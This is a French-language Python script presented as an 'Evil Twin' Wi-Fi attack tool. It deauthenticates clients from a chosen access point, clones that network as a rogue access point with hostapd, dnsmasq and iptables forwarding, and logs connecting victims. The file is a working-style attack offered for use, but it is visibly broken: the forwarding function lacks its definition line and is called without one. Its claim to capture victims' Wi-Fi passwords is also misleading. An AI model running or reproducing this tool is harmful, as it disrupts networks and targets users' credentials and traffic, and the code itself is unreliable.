#!/usr/bin/env python3
import os
import sys
import time
import signal
import subprocess
import threading
import re

# === Couleurs ===
RED    = "\033[1;31m"
ORANGE = "\033[1;33m"
YELLOW = "\033[93m"
GREEN  = "\033[1;32m"
BLUE   = "\033[1;34m"
CYAN   = "\033[1;36m"
RESET  = "\033[0m"

SCAN_FILE = "/tmp/ipf_scan"
active_processes = []

# === Gestion des signaux ===
def signal_handler(sig, frame):
    print(f"\n{YELLOW}[!] Interruption détectée. Nettoyage...{RESET}")
    cleanup()
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

def cleanup():
    """Nettoie tous les processus actifs"""
    global active_processes
    for proc in active_processes:
        try:
            proc.terminate()
            proc.wait(timeout=3)
        except:
            try:
                proc.kill()
            except:
                pass
    active_processes = []
    
    # Nettoyer les fichiers de scan
    try:
        for f in [f"{SCAN_FILE}-01.csv", f"{SCAN_FILE}-01.cap"]:
            if os.path.exists(f):
                os.remove(f)
    except:
        pass

def banner():
    os.system("clear")
    print(RED + r"""
          
 ██▓ ██▓███       █████▒██▓  ▄████  ██░ ██ ▄▄▄█████▓▓█████  ██▀███     
▓██▒▓██░  ██▒   ▓██   ▒▓██▒ ██▒ ▀█▒▓██░ ██▒▓  ██▒ ▓▒▓█   ▀ ▓██ ▒ ██▒   
▒██▒▓██░ ██▓▒   ▒████ ░▒██▒▒██░▄▄▄░▒██▀▀██░▒ ▓██░ ▒░▒███   ▓██ ░▄█ ▒   
░██░▒██▄█▓▒ ▒   ░▓█▒  ░░██░░▓█  ██▓░▓█ ░██ ░ ▓██▓ ░ ▒▓█  ▄ ▒██▀▀█▄     
░██░▒██▒ ░  ░   ░▒█░   ░██░░▒▓███▀▒░▓█▒░██▓  ▒██▒ ░ ░▒████▒░██▓ ▒██▒   
░▓  ▒▓▒░ ░  ░    ▒ ░   ░▓   ░▒   ▒  ▒ ░░▒░▒  ▒ ░░   ░░ ▒░ ░░ ▒▓ ░▒▓░   
 ▒ ░░▒ ░         ░      ▒ ░  ░   ░  ▒ ░▒░ ░    ░     ░ ░  ░  ░▒ ░ ▒░   
 ▒ ░░░           ░ ░    ▒ ░░ ░   ░  ░  ░░ ░  ░         ░     ░░   ░    
 ░                      ░        ░  ░  ░  ░            ░  ░   ░        
""" + RESET)
    print(f"{ORANGE}        >>> IPFighter — Evil Twin Wi-Fi Tool by H8Laws <<<{RESET}")
    print(f"{CYAN}                    Version 2.0 Enhanced{RESET}\n")

def list_interfaces():
    """Liste toutes les interfaces réseau Wi-Fi"""
    try:
        result = subprocess.check_output("iw dev | awk '$1==\"Interface\"{print $2}'", 
                                        shell=True, stderr=subprocess.DEVNULL)
        interfaces = result.decode().strip().split('\n')
        # Filtrer les lignes vides
        interfaces = [iface for iface in interfaces if iface]
        return interfaces
    except Exception as e:
        print(f"{RED}[-] Erreur lors de la récupération des interfaces: {e}{RESET}")
        return []

def choose_interface(prompt):
    """Permet à l'utilisateur de choisir une interface"""
    interfaces = list_interfaces()
    if not interfaces:
        print(f"{RED}[-] Aucune interface Wi-Fi détectée !{RESET}")
        sys.exit(1)
    
    print(f"\n{BLUE}[+] Interfaces disponibles :{RESET}")
    for i, iface in enumerate(interfaces):
        print(f"{YELLOW}  {i}.{RESET} {iface}")
    
    try:
        idx = int(input(f"\n{ORANGE}[?] {prompt} : {RESET}"))
        if 0 <= idx < len(interfaces):
            return interfaces[idx]
        else:
            print(f"{RED}[-] Choix invalide !{RESET}")
            sys.exit(1)
    except (ValueError, IndexError):
        print(f"{RED}[-] Choix invalide !{RESET}")
        sys.exit(1)

def kill_conflicts():
    """Tue les processus conflictuels"""
    print(f"\n{YELLOW}[*] Arrêt de NetworkManager & wpa_supplicant...{RESET}")
    subprocess.call("airmon-ng check kill", shell=True, 
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(1)

def start_monitor(interface):
    """
    Passe l'interface en mode monitor avec airmon-ng
    Retourne le nom de l'interface monitor créée
    """
    print(f"{GREEN}[+] Passage de {interface} en mode monitor...{RESET}")
    
    # Récupérer les interfaces avant
    try:
        before = set(list_interfaces())
    except Exception:
        before = set()
    
    # Lancer airmon-ng start
    try:
        out = subprocess.check_output(["airmon-ng", "start", interface], 
                                     stderr=subprocess.STDOUT)
    except subprocess.CalledProcessError as e:
        try:
            print(e.output.decode(errors="ignore"))
        except:
            pass
    
    # Attendre que l'interface soit créée
    time.sleep(2)
    
    # Récupérer les interfaces après
    try:
        after = set(list_interfaces())
    except Exception:
        after = set()
    
    # Chercher la nouvelle interface
    new = list(after - before)
    
    if not new:
        # Essayer de trouver une interface avec "mon" dans le nom
        candidates = [iface for iface in after if "mon" in iface.lower()]
        if candidates:
            mon_iface = candidates[0]
            print(f"{GREEN}[+] Interface monitor détectée : {mon_iface}{RESET}")
            return mon_iface
        else:
            print(f"{YELLOW}[!] Impossible de détecter l'interface monitor, utilisation de {interface}{RESET}")
            return interface
    
    # Si plusieurs nouvelles interfaces, préférer celle avec "mon"
    for iface in new:
        if "mon" in iface.lower():
            print(f"{GREEN}[+] Interface monitor créée : {iface}{RESET}")
            return iface
    
    print(f"{GREEN}[+] Interface monitor créée : {new[0]}{RESET}")
    return new[0]

def restore_network():
    """Restaure les services réseau"""
    print(f"\n{GREEN}[+] Restauration du réseau...{RESET}")
    
    # Arrêter les interfaces monitor
    try:
        ifaces = list_interfaces()
        mon_ifaces = [iface for iface in ifaces if "mon" in iface.lower()]
        for mon in mon_ifaces:
            print(f"{YELLOW}[*] Arrêt de l'interface monitor {mon}...{RESET}")
            subprocess.call(["airmon-ng", "stop", mon], 
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        pass
    
    # Redémarrer NetworkManager
    print(f"{YELLOW}[*] Redémarrage de NetworkManager...{RESET}")
    subprocess.call("systemctl restart NetworkManager", shell=True,
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    # Nettoyer iptables
    print(f"{YELLOW}[*] Nettoyage des règles iptables...{RESET}")
    subprocess.call("iptables --flush", shell=True,
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.call("iptables --table nat --flush", shell=True,
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.call("echo 0 > /proc/sys/net/ipv4/ip_forward", shell=True,
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def scan_aps(mon_iface, duration=15):
    """Scanne les points d'accès Wi-Fi"""
    print(f"\n{YELLOW}[+] Scan des réseaux Wi-Fi pendant {duration} secondes...{RESET}")
    print(f"{CYAN}[*] Appuyez sur Ctrl+C pour arrêter plus tôt{RESET}")
    
    # Nettoyer les anciens fichiers
    try:
        for f in [f"{SCAN_FILE}-01.csv", f"{SCAN_FILE}-01.cap"]:
            if os.path.exists(f):
                os.remove(f)
    except:
        pass
    
    cmd = [
        "airodump-ng",
        "--write-interval", "1",
        "--write", SCAN_FILE,
        "--output-format", "csv",
        mon_iface
    ]
    
    proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    try:
        time.sleep(duration)
        proc.terminate()
    except KeyboardInterrupt:
        proc.terminate()
    
    try:
        proc.wait(timeout=3)
    except:
        proc.kill()
    
    # Parser les résultats
    aps = []
    csv_file = f"{SCAN_FILE}-01.csv"
    
    if not os.path.exists(csv_file):
        print(f"{RED}[-] Fichier de scan introuvable !{RESET}")
        return aps
    
    try:
        with open(csv_file, encoding="utf-8", errors="ignore") as f:
            content = f.read()
            lines = content.splitlines()
            ap_section = False
            
            for line in lines:
                if "BSSID" in line and "ESSID" in line:
                    ap_section = True
                    continue
                
                if ap_section:
                    # Section clients commence par "Station MAC"
                    if "Station MAC" in line:
                        break
                    
                    if line.strip() == "":
                        continue
                    
                    fields = [f.strip() for f in line.split(",")]
                    
                    if len(fields) >= 14:
                        bssid = fields[0]
                        channel = fields[3]
                        essid = fields[13]
                        
                        # Ignorer les réseaux sans ESSID
                        if essid and essid != "" and bssid:
                            aps.append((bssid, channel, essid))
    
    except Exception as e:
        print(f"{RED}[-] Erreur lors de la lecture du CSV : {e}{RESET}")
    
    return aps

def select_ap(aps):
    """Permet de sélectionner un point d'accès cible"""
    print(f"\n{BLUE}   NUM   ESSID                 CH     BSSID{RESET}")
    print(f"{BLUE}  ----  -------------------  ----  -------------------{RESET}")
    
    for i, ap in enumerate(aps):
        bssid, channel, essid = ap
        print(f"{YELLOW}  {i:<4}{RESET}  {CYAN}{essid[:20]:<20}{RESET}  "
              f"{YELLOW}{channel:<4}{RESET}  {BLUE}{bssid}{RESET}")
    
    try:
        idx = int(input(f"\n{ORANGE}[?] Choix de l'AP cible : {RESET}"))
        if 0 <= idx < len(aps):
            return aps[idx]
        else:
            print(f"{RED}[-] Choix invalide !{RESET}")
            sys.exit(1)
    except (ValueError, IndexError):
        print(f"{RED}[-] Choix invalide !{RESET}")
        sys.exit(1)

def aggressive_deauth(mon_iface, bssid, duration=30):
    """Lance une attaque de déauthentification agressive"""
    print(f"\n{RED}[+] Attaque de déauthentification agressive pendant {duration}s...{RESET}")
    print(f"{YELLOW}[*] Cible : {bssid}{RESET}")
    
    end_time = time.time() + duration
    deauth_count = 0
    
    while time.time() < end_time:
        # Déauth broadcast
        proc = subprocess.Popen(
            ["aireplay-ng", "--deauth", "10", "-a", bssid, mon_iface],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        deauth_count += 1
        time.sleep(0.5)
        proc.terminate()
        
        # Afficher progression toutes les 5 secondes
        if deauth_count % 10 == 0:
            remaining = int(end_time - time.time())
            print(f"{CYAN}[*] {deauth_count} salves envoyées | Temps restant: {remaining}s{RESET}")
    
    print(f"{GREEN}[+] Déauthentification terminée. Total: {deauth_count} salves{RESET}")

def create_fake_ap(mon_iface, ssid, bssid, channel, force_wpa=True):
    """Crée un faux point d'accès avec hostapd et dnsmasq"""
    global active_processes
    
    print(f"\n{GREEN}[+] Création du faux AP '{ssid}' sur le canal {channel}...{RESET}")
    
    # Vérifier les dépendances
    if subprocess.run(["which", "hostapd"], capture_output=True).returncode != 0:
        print(f"{RED}[-] hostapd n'est pas installé !{RESET}")
        print(f"{ORANGE}[!] Installez-le avec: apt install hostapd{RESET}")
        return None, None
    
    if subprocess.run(["which", "dnsmasq"], capture_output=True).returncode != 0:
        print(f"{RED}[-] dnsmasq n'est pas installé !{RESET}")
        print(f"{ORANGE}[!] Installez-le avec: apt install dnsmasq{RESET}")
        return None, None
    
    # Configurer le canal
    subprocess.call(["iwconfig", mon_iface, "channel", str(channel)],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    # Configuration hostapd de base
    hostapd_conf = f"""interface={mon_iface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
macaddr_acl=0
ignore_broadcast_ssid=0
"""
    
    # Configuration WPA2 obligatoire pour forcer la capture de mot de passe
    if force_wpa:
        print(f"\n{CYAN}[*] Configuration WPA2 pour capturer les tentatives de connexion...{RESET}")
        fake_password = "hackthisnetwork123"  # Mot de passe factice
        hostapd_conf += f"""auth_algs=1
wpa=2
wpa_passphrase={fake_password}
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
wpa_pairwise=CCMP
"""
        print(f"{YELLOW}[!] Les victimes devront entrer un mot de passe{RESET}")
        print(f"{YELLOW}[!] Leurs tentatives seront capturées dans /tmp/hostapd_evil.log{RESET}")
    
    try:
        with open("/tmp/hostapd_evil.conf", "w") as f:
            f.write(hostapd_conf)
    except:
        print(f"{RED}[-] Erreur lors de la création de la configuration hostapd{RESET}")
        return None, None
    
    # Configuration interface
    print(f"{YELLOW}[*] Configuration de l'interface {mon_iface}...{RESET}")
    subprocess.call(["ifconfig", mon_iface, "up"],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.call(["ifconfig", mon_iface, "10.0.0.1", "netmask", "255.255.255.0"],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    # Configuration dnsmasq
    dnsmasq_conf = f"""interface={mon_iface}
dhcp-range=10.0.0.10,10.0.0.100,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
log-dhcp
bind-interfaces
"""
    
    try:
        with open("/tmp/dnsmasq_evil.conf", "w") as f:
            f.write(dnsmasq_conf)
    except:
        print(f"{RED}[-] Erreur lors de la création de la configuration dnsmasq{RESET}")
        return None, None
    
    # Lancer hostapd avec logging
    print(f"{GREEN}[+] Démarrage de hostapd avec capture des tentatives...{RESET}")
    log_file = open("/tmp/hostapd_evil.log", "w")
    hostapd_proc = subprocess.Popen(
        ["hostapd", "/tmp/hostapd_evil.conf"],
        stdout=log_file, stderr=log_file
    )
    active_processes.append(hostapd_proc)
    time.sleep(3)
    
    # Lancer dnsmasq
    print(f"{GREEN}[+] Démarrage de dnsmasq...{RESET}")
    dnsmasq_proc = subprocess.Popen(
        ["dnsmasq", "-C", "/tmp/dnsmasq_evil.conf", "-d"],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    active_processes.append(dnsmasq_proc)
    
    return hostapd_proc, dnsmasq_proc

def monitor_connections():
    """Monitore les tentatives de connexion dans les logs"""
    print(f"\n{CYAN}[*] Démarrage du monitoring des connexions...{RESET}")
    log_file = "/tmp/hostapd_evil.log"
    
    if not os.path.exists(log_file):
        return
    
    # Suivre le fichier en temps réel
    seen_positions = 0
    captured_attempts = []
    
    while True:
        try:
            with open(log_file, "r") as f:
                f.seek(seen_positions)
                new_lines = f.readlines()
                seen_positions = f.tell()
                
                for line in new_lines:
                    # Détecter les tentatives de connexion
                    if "STA" in line and "IEEE 802.11: associated" in line:
                        # Extraire l'adresse MAC
                        match = re.search(r'([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})', line)
                        if match:
                            mac = match.group(0)
                            timestamp = time.strftime("%H:%M:%S")
                            print(f"{GREEN}[+] [{timestamp}] Client connecté: {mac}{RESET}")
                    
                    # Détecter les échecs d'authentification (mauvais mot de passe)
                    if "WPA" in line and "failed" in line.lower():
                        match = re.search(r'([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})', line)
                        if match:
                            mac = match.group(0)
                            timestamp = time.strftime("%H:%M:%S")
                            if mac not in captured_attempts:
                                captured_attempts.append(mac)
                                print(f"{RED}[!] [{timestamp}] Tentative de mot de passe capturée: {mac}{RESET}")
                                print(f"{YELLOW}    → Vérifiez /tmp/hostapd_evil.log pour les détails{RESET}")
            
            time.sleep(1)
        except Exception:
            time.sleep(1)
            continue

    """Configure le routage et NAT pour rediriger le trafic"""
    print(f"\n{GREEN}[+] Configuration du routage vers {inet_iface}...{RESET}")
    
    # Activer le forwarding IP
    subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True,
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    # Nettoyer les règles existantes
    subprocess.call("iptables --flush", shell=True,
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.call("iptables --table nat --flush", shell=True,
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.call("iptables --delete-chain", shell=True,
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.call("iptables --table nat --delete-chain", shell=True,
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    # Configurer NAT
    subprocess.call(f"iptables -t nat -A POSTROUTING -o {inet_iface} -j MASQUERADE", 
                   shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.call("iptables -A FORWARD -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT", 
                   shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.call(f"iptables -A FORWARD -i {mon_iface} -j ACCEPT", 
                   shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    print(f"{GREEN}[+] Routage configuré avec succès !{RESET}")

def main():
    # Vérifier root
    if os.geteuid() != 0:
        print(f"{RED}[-] Ce script doit être exécuté en tant que root !{RESET}")
        sys.exit(1)
    
    banner()
    
    # Choix des interfaces
    inet_iface = choose_interface("Interface pour ACCÈS Internet (eth0, wlan0 connectée, etc.)")
    
    banner()
    atk_iface = choose_interface("Interface pour ATTAQUE (sera passée en mode monitor)")
    
    # Préparation
    kill_conflicts()
    mon_iface = start_monitor(atk_iface)
    
    # Scan des AP
    aps = scan_aps(mon_iface)
    
    if not aps:
        print(f"{RED}[-] Aucun point d'accès détecté !{RESET}")
        restore_network()
        return
    
    # Sélection de la cible
    bssid, channel, essid = select_ap(aps)
    
    print(f"\n{BLUE}{'='*60}{RESET}")
    print(f"{CYAN}Cible sélectionnée:{RESET}")
    print(f"{CYAN}  • SSID : {essid}{RESET}")
    print(f"{CYAN}  • BSSID : {bssid}{RESET}")
    print(f"{CYAN}  • Canal : {channel}{RESET}")
    print(f"{BLUE}{'='*60}{RESET}")
    
    # Demander la durée de l'attaque de déauth
    print(f"\n{ORANGE}[?] Configuration de l'attaque:{RESET}")
    deauth_duration = input(f"{ORANGE}    Durée de déauthentification (secondes, défaut: 30) : {RESET}").strip()
    deauth_duration = int(deauth_duration) if deauth_duration.isdigit() else 30
    
    # Lancer l'attaque de déauthentification agressive
    aggressive_deauth(mon_iface, bssid, deauth_duration)
    
    # Créer le faux AP avec WPA2 obligatoire
    print(f"\n{YELLOW}[*] Création du faux AP avec protection WPA2...{RESET}")
    print(f"{YELLOW}[*] Les clients seront forcés de se reauthentifier{RESET}")
    hostapd_proc, dnsmasq_proc = create_fake_ap(mon_iface, essid, bssid, channel, force_wpa=True)
    
    if not hostapd_proc or not dnsmasq_proc:
        print(f"{RED}[-] Échec de la création du faux AP{RESET}")
        cleanup()
        restore_network()
        return
    
    # Configuration du routage
    setup_forwarding(inet_iface, mon_iface)
    
    # Continuer la déauth en arrière-plan
    print(f"\n{YELLOW}[*] Lancement de la déauthentification continue en arrière-plan...{RESET}")
    continuous_deauth_proc = subprocess.Popen(
        ["aireplay-ng", "--deauth", "0", "-a", bssid, mon_iface],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    active_processes.append(continuous_deauth_proc)
    
    # Démarrer le monitoring dans un thread séparé
    monitor_thread = threading.Thread(target=monitor_connections, daemon=True)
    monitor_thread.start()
    
    # Affichage des informations
    print(f"\n{GREEN}{'='*60}{RESET}")
    print(f"{CYAN}[✓] Evil Twin actif avec capture de mot de passe !{RESET}")
    print(f"{CYAN}[*] SSID cible : {essid}{RESET}")
    print(f"{CYAN}[*] BSSID : {bssid}{RESET}")
    print(f"{CYAN}[*] Canal : {channel}{RESET}")
    print(f"{CYAN}[*] Interface monitor : {mon_iface}{RESET}")
    print(f"{CYAN}[*] Interface Internet : {inet_iface}{RESET}")
    print(f"{CYAN}[*] Gateway : 10.0.0.1{RESET}")
    print(f"{GREEN}{'='*60}{RESET}")
    print(f"\n{RED}[!] Déauthentification continue du vrai AP{RESET}")
    print(f"{YELLOW}[!] Les victimes seront forcées de se reconnecter au faux AP{RESET}")
    print(f"{YELLOW}[!] Elles devront entrer le mot de passe Wi-Fi{RESET}")
    print(f"{YELLOW}[!] Les tentatives sont loggées dans /tmp/hostapd_evil.log{RESET}")
    print(f"{CYAN}[!] Les connexions réussies obtiendront une IP 10.0.0.x{RESET}")
    print(f"{CYAN}[!] Leur trafic sera routé via {inet_iface}{RESET}")
    print(f"\n{ORANGE}[*] Appuyez sur Ctrl+C pour arrêter...{RESET}\n")
    
    try:
        # Boucle principale
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[!] Arrêt de l'Evil Twin...{RESET}")
    finally:
        cleanup()
        restore_network()
        print(f"\n{GREEN}[+] Nettoyage terminé. Au revoir !{RESET}")

if __name__ == "__main__":
    main()
    